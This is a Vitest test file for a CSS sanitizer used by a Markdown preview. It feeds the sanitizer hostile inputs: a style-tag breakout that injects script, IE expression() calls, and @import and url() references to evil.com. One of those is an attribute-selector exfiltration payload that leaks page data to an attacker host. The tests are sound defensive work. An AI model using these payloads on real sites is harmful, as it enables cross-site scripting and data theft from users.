import { describe, expect, it } from 'vitest'
import { sanitizeCustomCss } from './MarkdownPreview'

describe('sanitizeCustomCss', () => {
  it('returns empty string for empty input', () => {
    expect(sanitizeCustomCss('')).toBe('')
  })

  it('passes through safe declarations untouched', () => {
    const css = '.md-h1 { color: #333; font-weight: 700; }'
    expect(sanitizeCustomCss(css)).toBe(css)
  })

  it('strips @import directives', () => {
    const css = '@import url("http://evil.com/exfil.css"); .foo { color: red; }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/@import/i)
    expect(result).toContain('.foo')
  })

  it('strips </style> breakout attempts', () => {
    const css = '.foo { color: red; }</style><script>alert(1)</script>'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/<\/style/i)
  })

  it('neutralizes expression() (legacy IE script execution)', () => {
    const css = '.foo { width: expression(alert(1)); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/expression\s*\(/i)
  })

  it('neutralizes http(s) url() references', () => {
    const httpCss = '.foo { background: url("http://evil.com/track.png"); }'
    const httpsCss = '.foo { background: url(https://evil.com/track.png); }'
    expect(sanitizeCustomCss(httpCss)).not.toContain('http://evil.com')
    expect(sanitizeCustomCss(httpsCss)).not.toContain('https://evil.com')
  })

  it('neutralizes protocol-relative url() references', () => {
    const css = '.foo { background: url(//evil.com/track.png); }'
    expect(sanitizeCustomCss(css)).not.toContain('//evil.com')
  })

  it('preserves data: url() references', () => {
    const css = '.foo { background: url(data:image/png;base64,iVBORw0KGgo=); }'
    const result = sanitizeCustomCss(css)
    expect(result).toContain('data:image/png;base64,iVBORw0KGgo=')
  })

  it('blocks attribute-selector exfiltration via url()', () => {
    const css = '[href^="secret"] { background: url("https://evil.com/leak"); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toContain('https://evil.com')
  })

  it('handles case variations', () => {
    const css = '@IMPORT URL("http://x"); .a { WIDTH: EXPRESSION(x); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/@import/i)
    expect(result).not.toMatch(/expression\s*\(/i)
  })
})
